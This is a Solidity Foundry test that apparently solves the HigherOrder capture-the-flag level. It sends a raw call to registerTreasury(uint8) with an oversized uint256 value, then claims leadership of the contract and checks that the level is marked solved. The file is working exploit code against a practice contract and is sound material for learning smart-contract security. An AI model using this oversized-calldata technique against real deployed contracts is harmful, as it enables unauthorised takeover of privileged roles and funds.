// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "./HigherOrderFactory.sol";

contract HigherOrderTest is Test {
    HigherOrderFactory factory;
    HigherOrder higherOrderInstance;

    function setUp() public {
        factory = new HigherOrderFactory();
        higherOrderInstance = HigherOrder(factory.createInstance(address(this)));
    }

    function testHigherOrder() public {
        (bool success,) =
            address(higherOrderInstance).call(abi.encodeWithSignature("registerTreasury(uint8)", type(uint256).max));
        require(success, "registerTreasury failed");

        higherOrderInstance.claimLeadership();

        assertTrue(factory.validateInstance(payable(address(higherOrderInstance)), address(this)));
    }
}
